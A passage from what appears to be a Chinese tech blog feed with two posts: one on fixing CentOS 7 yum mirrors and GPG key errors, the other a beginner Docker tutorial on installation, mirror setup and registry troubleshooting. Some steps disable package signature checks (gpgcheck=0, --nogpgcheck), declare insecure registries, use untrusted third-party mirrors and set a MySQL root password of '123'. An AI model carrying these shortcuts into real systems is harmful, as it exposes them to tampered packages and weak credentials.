operator">=</span>http://mirrors.aliyun.com/centos-vault/centos/<span class="token variable">$releasever</span>/os/<span class="token variable">$basearch</span>/<span class="token assign-left variable">gpgcheck</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">gpgkey</span><span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6 <span class="token comment">#released updates </span><span class="token punctuation">[</span>updates<span class="token punctuation">]</span><span class="token assign-left variable">name</span><span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Updates - mirrors.aliyun.com<span class="token assign-left variable">failovermethod</span><span class="token operator">=</span>priority<span class="token assign-left variable">baseurl</span><span class="token operator">=</span>http://mirrors.aliyun.com/centos-vault/centos/<span class="token variable">$releasever</span>/updates/<span class="token variable">$basearch</span>/<span class="token assign-left variable">gpgcheck</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">gpgkey</span><span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6 <span class="token comment">#additional packages that may be useful</span><span class="token punctuation">[</span>extras<span class="token punctuation">]</span><span class="token assign-left variable">name</span><span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Extras - mirrors.aliyun.com<span class="token assign-left variable">failovermethod</span><span class="token operator">=</span>priority<span class="token assign-left variable">baseurl</span><span class="token operator">=</span>http://mirrors.aliyun.com/centos-vault/centos/<span class="token variable">$releasever</span>/extras/<span class="token variable">$basearch</span>/<span class="token assign-left variable">gpgcheck</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">gpgkey</span><span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6 <span class="token comment">#additional packages that extend functionality of existing packages</span><span class="token punctuation">[</span>centosplus<span class="token punctuation">]</span><span class="token assign-left variable">name</span><span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Plus - mirrors.aliyun.com<span class="token assign-left variable">failovermethod</span><span class="token operator">=</span>priority<span class="token assign-left variable">baseurl</span><span class="token operator">=</span>http://mirrors.aliyun.com/centos-vault/centos/<span class="token variable">$releasever</span>/centosplus/<span class="token variable">$basearch</span>/<span class="token assign-left variable">gpgcheck</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">enabled</span><span class="token operator">=</span><span class="token number">0</span><span class="token assign-left variable">gpgkey</span><span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6 <span class="token comment">#contrib - packages by Centos Users</span><span class="token punctuation">[</span>contrib<span class="token punctuation">]</span><span class="token assign-left variable">name</span><span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Contrib - mirrors.aliyun.com<span class="token assign-left variable">failovermethod</span><span class="token operator">=</span>priority<span class="token assign-left variable">baseurl</span><span class="token operator">=</span>http://mirrors.aliyun.com/centos-vault/centos/<span class="token variable">$releasever</span>/contrib/<span class="token variable">$basearch</span>/<span class="token assign-left variable">gpgcheck</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">enabled</span><span class="token operator">=</span><span class="token number">0</span><span class="token assign-left variable">gpgkey</span><span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>【后面的踩的坑，gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6改成gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7】</p><ul><li>清理更新缓存</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#清空yum缓存</span>yum clean all<span class="token comment">#重建yum缓存</span>yum makecache<span class="token comment">#列出yum列表</span>yum list<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.41.24.png" style="zoom:30%;"><h3 id="2-4-5-重新安装net-tools"><a href="#2-4-5-重新安装net-tools" class="headerlink" title="2.4.5 重新安装net-tools"></a>2.4.5 重新安装net-tools</h3><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.54.45.png" alt="截屏2024-12-12 16.54.45"></p><blockquote><ul><li>问题解决方法：</li></ul><p>（方法1）</p><p>这个就是安装的时候会检查key。</p><p>在repo文件中关闭即可。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/yum.repos.d/epel.repo<span class="token punctuation">[</span>epel<span class="token punctuation">]</span><span class="token assign-left variable">name</span><span class="token operator">=</span>Extra Packages <span class="token keyword">for</span> Enterprise Linux <span class="token number">7</span> - <span class="token variable">$basearch</span><span class="token comment">#baseurl=http://download.fedoraproject.org/pub/epel/7/$basearch</span><span class="token assign-left variable">metalink</span><span class="token operator">=</span>https://mirrors.fedoraproject.org/metalink?repo<span class="token operator">=</span>epel-7<span class="token operator">&amp;</span><span class="token assign-left variable">arch</span><span class="token operator">=</span><span class="token variable">$basearch</span> <span class="token assign-left variable">failovermethod</span><span class="token operator">=</span>priority<span class="token assign-left variable">enabled</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">pgcheck</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">gpgkey</span><span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把gpgcheck=1  改为gpgcheck=0 即可，意思是在安装的时候不进行源的检查</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.58.38.png" style="zoom:40%;"><p>但是并没有这个文件。</p><p>尝试新建一个文件写入相关内容。</p><p>加入这个文件之后yum update都存在问题了。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2017.08.37.png" style="zoom:30%;"><p>….CentOS-7的密钥是存在的，为什么会检查CentOS-6，原因是之前配置yum源的gpgkey的配置。改成CentOS-7即可。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2017.09.53.png" style="zoom:50%;"><p>（方法2）</p><p># 在yum install 版本后面加上 –nogpgcheck，即可绕过GPG验证成功安装<br>　　yum install mysql-community-server –nogpgcheck</p><p>但这个方法不长久，每次都得多加参数。</p></blockquote><p>重新安装net-tools</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> net-tools<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2017.13.53.png" style="zoom:50%;"><p>成功之后执行ifconfig命令，成功执行。</p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://b11et3un53m.feishu.cn/wiki/Rfocw7ctXij2RBkShcucLZbrn2d">https://b11et3un53m.feishu.cn/wiki/Rfocw7ctXij2RBkShcucLZbrn2d</a> </p>]]></content>
      
      
      <categories>
          
          <category> 虚拟化技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟机安装 </tag>
            
            <tag> centos安装 </tag>
            
            <tag> yum源配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker入门到进阶</title>
      <link href="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/"/>
      <url>/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Docker简介"><a href="#一、Docker简介" class="headerlink" title="一、Docker简介"></a>一、Docker简介</h1><p>Docker 是一种开源的容器化技术，能够将应用及其依赖打包进轻量级、可移植的容器中，实现快速部署和跨平台运行。</p><p>即：Docker是一个快速构建、运行、管理应用的工具。</p><h2 id="1-1-镜像和容器"><a href="#1-1-镜像和容器" class="headerlink" title="1.1 镜像和容器"></a>1.1 镜像和容器</h2><p>当我们利用Docker安装应用时，Docker会自动搜索并下载应用镜像（image）。镜像不仅包含应用本身，还包含应用运行所需要的环境、配置、系统函数库。Docker会在运行镜像时创建一个隔离环境，称为容器（container）。</p><p>镜像仓库：存储和管理镜像的平台，Docker官方维护了一个公共仓库：<a href="https://hub.docker.com/">Docker Hub</a>。</p><p>下图所示为docker、容器、镜像和镜像仓库的逻辑关系：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2009.49.19.png" style="zoom:50%;"><ul><li><p>容器（Container）是一种轻量级的、可执行的软件包，它将代码和环境打包在一起，确保应用在任何地方都能以相同的方式运行。容器是独立且隔离的，运行在宿主机上，共享操作系统内核，但与其他容器相互隔离。</p></li><li><p>镜像（Image）是容器运行的模板，包含了运行容器所需的代码、运行时、系统工具、系统库等。镜像是只读的，可以被多个容器实例共享，确保了环境的一致性。</p></li><li><p>仓库（Repository）是存放容器镜像的场所，可以是本地的也可以是远程的。常用的远程仓库包括 Docker Hub 和私有仓库。开发者将镜像推送到仓库中，其他用户可以从仓库中拉取镜像来创建和运行容器。</p></li></ul><blockquote><p>Docker是做什么的？</p><ul><li>Docker可以帮助我们下载应用镜像，创建并运行镜像的容器，从而快速部署应用。</li></ul><p>什么是镜像？</p><ul><li>将应用所需的函数库、依赖、配置等与应用一起打包得到的就是镜像。</li></ul><p>什么是容器?</p><ul><li>为每个镜像的应用进程创建的隔离运行环境就是容器。</li></ul><p>什么是镜像仓库?</p><ul><li>存储和管理镜像的服务就是镜像仓库，DockerHub是目前最大的镜像仓库，其中包含各种常见的应用镜像。</li></ul></blockquote><h1 id="二、Docker安装"><a href="#二、Docker安装" class="headerlink" title="二、Docker安装"></a>二、Docker安装</h1><h2 id="2-1-虚拟机系统准备"><a href="#2-1-虚拟机系统准备" class="headerlink" title="2.1 虚拟机系统准备"></a>2.1 虚拟机系统准备</h2><p>见【centos虚拟机安装及问题解决】一文。</p><p>我最后用的系统，centos7</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.19.27.png" style="zoom:50%;"><h2 id="2-2-卸载旧版Docker"><a href="#2-2-卸载旧版Docker" class="headerlink" title="2.2 卸载旧版Docker"></a>2.2 卸载旧版Docker</h2><p>首先如果系统中已经存在旧的Docker，则先卸载：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum remove <span class="token function">docker</span> <span class="token punctuation">\</span>    docker-client <span class="token punctuation">\</span>    docker-client-latest <span class="token punctuation">\</span>    docker-common <span class="token punctuation">\</span>    docker-latest <span class="token punctuation">\</span>    docker-latest-logrotate <span class="token punctuation">\</span>    docker-logrotate <span class="token punctuation">\</span>    docker-engine <span class="token punctuation">\</span>    docker-selinux <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.18.18.png" alt="截屏2024-12-12 17.18.18" style="zoom:35%;"><p>我的虚拟机上没有需要删除的docker相关的包。</p><h2 id="2-3-配置Docker的yum源"><a href="#2-3-配置Docker的yum源" class="headerlink" title="2.3 配置Docker的yum源"></a>2.3 配置Docker的yum源</h2><h3 id="2-3-1-yum工具包安装"><a href="#2-3-1-yum工具包安装" class="headerlink" title="2.3.1 yum工具包安装"></a>2.3.1 yum工具包安装</h3><p>首先要安装一个yum工具。</p><pre class="line-numbers language-Bash" data-language="Bash"><code class="language-Bash">sudo yum install -y yum-utils device-mapper-persistent-data lvm2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.21.05.png" style="zoom:50%;"><h3 id="2-3-2-配置yum源"><a href="#2-3-2-配置yum源" class="headerlink" title="2.3.2 配置yum源"></a>2.3.2 配置yum源</h3><p>安装成功后，执行命令，配置Docker的yum源（已更新为阿里云源）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<span class="token function">sudo</span> <span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s+download.docker.com+mirrors.aliyun.com/docker-ce+'</span> /etc/yum.repos.d/docker-ce.repo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.21.54.png" alt="截屏2024-12-12 17.21.54"></p><blockquote><p>sudo sed -i ‘s+download.docker.com+mirrors.aliyun.com/docker-ce+’ /etc/yum.repos.d/docker-ce.repo</p><p>命令解释：</p><ol><li><code>sed</code>: 调用sed工具，它是一个流编辑器，用于对文本进行过滤和替换。</li><li><code>-i</code>: 选项告诉sed直接在文件中进行编辑，而不是输出到标准输出（即终端）。这会导致原文件被修改。</li><li><code>'s+download.docker.com+mirrors.aliyun.com/docker-ce+'</code>: 这是一个sed的替换命令，它指示sed执行以下操作：<ul><li><code>s</code>: 表示替换（substitute）。</li><li><code>+</code>: 在sed中用作分隔符，这里它替代了默认的空格分隔符，因为默认的空格在URL中会出现，使用<code>+</code>可以避免这种情况。</li><li><code>download.docker.com</code>: 这是要被替换的字符串，即原始的Docker镜像源地址。</li><li><code>mirrors.aliyun.com/docker-ce</code>: 这是替换后的字符串，即阿里云的Docker镜像源地址。</li></ul></li><li><code>/etc/yum.repos.d/docker-ce.repo</code>: 指定了要编辑的文件路径。这个文件是Docker CE（社区版）的YUM仓库配置文件。</li></ol></blockquote><h3 id="2-3-3-更新yum，建立缓存"><a href="#2-3-3-更新yum，建立缓存" class="headerlink" title="2.3.3 更新yum，建立缓存"></a>2.3.3 更新yum，建立缓存</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum makecache fast<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.22.36.png" style="zoom:40%;"><h2 id="2-4-安装Docker"><a href="#2-4-安装Docker" class="headerlink" title="2.4 安装Docker"></a>2.4 安装Docker</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> <span class="token parameter variable">-y</span> docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.27.07.png" style="zoom:50%;"><h2 id="2-5-启动和校验安装是否成功"><a href="#2-5-启动和校验安装是否成功" class="headerlink" title="2.5 启动和校验安装是否成功"></a>2.5 启动和校验安装是否成功</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查看docker状态</span>systemctl status <span class="token function">docker</span><span class="token comment"># 启动Docker</span>systemctl start <span class="token function">docker</span><span class="token comment"># 停止Docker</span>systemctl stop <span class="token function">docker</span><span class="token comment"># 重启</span>systemctl restart <span class="token function">docker</span><span class="token comment"># 设置开机自启</span>systemctl <span class="token builtin class-name">enable</span> <span class="token function">docker</span><span class="token comment"># 执行docker ps命令，如果不报错，说明安装启动成功</span><span class="token function">docker</span> <span class="token function">ps</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.29.23.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.30.03.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.32.21.png" alt="截屏2024-12-12 17.32.21" style="zoom:40%;"><h2 id="2-6-配置镜像加速"><a href="#2-6-配置镜像加速" class="headerlink" title="2.6 配置镜像加速"></a>2.6 配置镜像加速</h2><p>阿里云docker镜像加速：</p><p><a href="https://help.aliyun.com/zh/acr/user-guide/accelerate-the-pulls-of-docker-official-images">https://help.aliyun.com/zh/acr/user-guide/accelerate-the-pulls-of-docker-official-images</a></p><h3 id="2-6-1-获取镜像加速器地址"><a href="#2-6-1-获取镜像加速器地址" class="headerlink" title="2.6.1 获取镜像加速器地址"></a>2.6.1 获取镜像加速器地址</h3><ol><li>登录<a href="https://cr.console.aliyun.com/?spm=a2c4g.11186623.0.0.27881d82aiM6LW">容器镜像服务控制台</a>。</li><li>在左侧导航栏选择<em><strong>*镜像工具** &gt; **镜像加速器*</strong></em></li><li>在<strong>镜像加速器</strong>页面获取<strong>加速器地址</strong>。</li></ol><h3 id="2-6-2-配置镜像加速器"><a href="#2-6-2-配置镜像加速器" class="headerlink" title="2.6.2 配置镜像加速器"></a>2.6.2 配置镜像加速器</h3><p>Docker和Containerd的镜像加速器配置方法有所不同。您可以根据具体情况选择合适的配置方式。</p><p>可以先使用<code>docker --version</code>查看Docker的版本，然后根据实际情况选择不同的配置方式。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.42.13.png" style="zoom:50%;"><h3 id="新版本Docker（1-10及以上）"><a href="#新版本Docker（1-10及以上）" class="headerlink" title="新版本Docker（1.10及以上）"></a><strong>新版本Docker（1.10及以上）</strong></h3><p>创建并编辑<code>/etc/docker/daemon.json</code>文件（如果文件不存在，则创建）：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"&lt;镜像加速器地址&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">}</span>            <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /etc/docker<span class="token function">sudo</span> <span class="token function">tee</span> /etc/docker/daemon.json <span class="token operator">&lt;&lt;-</span><span class="token string">'EOF'{  "registry-mirrors": ["https://xxxxxxxx.aliyuncs.com"]}EOF</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后重启Docker Daemon。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl daemon-reload<span class="token function">sudo</span> systemctl restart <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="三、Docker快速入门（一键部署mysql）"><a href="#三、Docker快速入门（一键部署mysql）" class="headerlink" title="三、Docker快速入门（一键部署mysql）"></a>三、Docker快速入门（一键部署mysql）</h1><h2 id="3-1-一键部署mysql"><a href="#3-1-一键部署mysql" class="headerlink" title="3.1 一键部署mysql"></a>3.1 一键部署mysql</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">-d</span> <span class="token parameter variable">--name</span> ms <span class="token parameter variable">-p</span> <span class="token number">3306</span>:3306 <span class="token parameter variable">-e</span> <span class="token assign-left variable">MYSQL_ROOT_PASSWORD</span><span class="token operator">=</span><span class="token number">123</span> mysql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>命令解读：</p><p><strong>docker run</strong> ：创建并运行一个容器，**-d** 是让容器在后台运行</p><p><strong>–name mysql</strong> ：给容器起个名字，必须唯一</p><p><strong>-p 3306:3306</strong> ：设置端口映射 ，&lt;宿主机端口&gt;:&lt;容器端口&gt;</p><p><strong>-e KEY=VALUE</strong> ：是设置环境变量</p><p><strong>mysql</strong> ：指定运行的镜像的名字</p></blockquote><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.51.05.png" style="zoom:50%;"><h2 id="3-2-镜像加速问题解决"><a href="#3-2-镜像加速问题解决" class="headerlink" title="3.2 镜像加速问题解决"></a>3.2 镜像加速问题解决</h2><blockquote><p>问题解决：</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.53.02.png" alt="截屏2024-12-12 17.53.02"></p><p>网上有很多原因解释，一是说因为没有配置镜像加速，可是刚在前面配置过，并且也重启了docker。</p><p>尝试更换为如下的地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"registry-mirrors"</span>:<span class="token punctuation">[</span><span class="token string">"https://docker.mirrors.ustc.edu.cn"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还是不行。</p><p>继续鼓捣这个daemon.json</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span> <span class="token string">"registry-mirrors"</span> <span class="token builtin class-name">:</span> <span class="token punctuation">[</span>   <span class="token string">"https://mirror.ccs.tencentyun.com"</span>,   <span class="token string">"http://registry.docker-cn.com"</span>,   <span class="token string">"http://docker.mirrors.ustc.edu.cn"</span>,   <span class="token string">"http://hub-mirror.c.163.com"</span> <span class="token punctuation">]</span>, <span class="token string">"insecure-registries"</span> <span class="token builtin class-name">:</span> <span class="token punctuation">[</span>   <span class="token string">"registry.docker-cn.com"</span>,   <span class="token string">"docker.mirrors.ustc.edu.cn"</span> <span class="token punctuation">]</span>, <span class="token string">"debug"</span> <span class="token builtin class-name">:</span> true, <span class="token string">"experimental"</span> <span class="token builtin class-name">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span><span class="token string">"registry-mirrors"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token string">"https://docker.mirrors.ustc.edu.cn/"</span>,<span class="token string">"https://hub-mirror.c.163.com"</span>,<span class="token string">"https://registry.docker-cn.com"</span><span class="token punctuation">]</span>,<span class="token string">"insecure-registries"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token string">"10.0.0.12:5000"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>还是不行。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2018.02.59.png" style="zoom:50%;"><p>发现是域名解析的问题，然后尝试追加网卡配置：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/sysconfig/network-scripts/ifcfg-ens33<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2018.05.00.png" style="zoom:40%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2018.09.10.png" style="zoom:50%;"><p>还是无法ping通。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2018.06.14.png" alt="截屏2024-12-12 18.06.14" style="zoom:50%;"><ul><li>使用dig获取ip</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> bind-utils<span class="token function">dig</span> @114.114.114.114 registry-1.docker.io<span class="token function">dig</span> @8.8.8.8 registry-1.docker.io<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2018.14.08.png" alt="截屏2024-12-12 18.14.08"></p><p>dig到的ip208.43.170.231…ping不通。</p><p>docker info查看信息，镜像仓库已经配置成功，网页访问一下各个地址，发现都访问不了。</p><p>最终通过不断尝试和查找资料找到一种可行的方法，直接在镜像名前面加可用的仓库地址（这个需要不断搜集更新，时不时就有可能被墙）。</p><p>最终解决：</p><p>1）收集仓库地址，http访问测试连通性并配置。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.14.38.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://docker.1panel.dev/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tee</span> /etc/docker/daemon.json <span class="token operator">&lt;&lt;</span><span class="token string">EOF{    "registry-mirrors": ["https://docker.1panel.dev"]}EOF</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl daemon-reloadsystemctl restart <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2）拉取镜像的时候添加路径</p><p>按照上面的过程操作之后，还是会报错。</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.15.17.png" alt="截屏2024-12-13 09.15.17"></p><p>这时候添加路径进行尝试。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.17.23.png" alt="截屏2024-12-13 09.17.23" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.18.00.png" alt="截屏2024-12-13 09.18.00" style="zoom:50%;"><p>说明还是挂掉了。那么就需要继续找新的能用的镜像仓库。</p><p><a href="https://www.cnblogs.com/Nine4Cool/p/18499621">https://www.cnblogs.com/Nine4Cool/p/18499621</a></p><p><a href="https://blog.csdn.net/llc580231/article/details/139979603">https://blog.csdn.net/llc580231/article/details/139979603</a></p><p>最后下面一些可用的镜像仓库地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://docker.m.daocloud.iohttps://docker.zhai.cm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.46.59.png" alt="截屏2024-12-13 09.46.59" style="zoom:50%;"><p>注意：单次指定从某个仓库拉取镜像，指定<code>域名/library/mysql</code>。</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.42.02.png" alt="截屏2024-12-13 09.42.02"></p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.44.59.png" alt="截屏2024-12-13 09.44.59"></p><p>仍然会拉取失败。。。。。。。</p><p>用<a href="https://docker.zhai.cm/">https://docker.zhai.cm</a> 拉取成功。</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.49.46.png" alt="截屏2024-12-13 09.49.46"></p><p>所以进行配置：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">tee</span> /etc/docker/daemon.json <span class="token operator">&lt;&lt;</span><span class="token string">EOF{    "registry-mirrors": ["https://docker.zhai.cm"]}EOF</span>systemctl daemon-reloadsystemctl restart <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再尝试拉取一下nginx镜像。</p><img 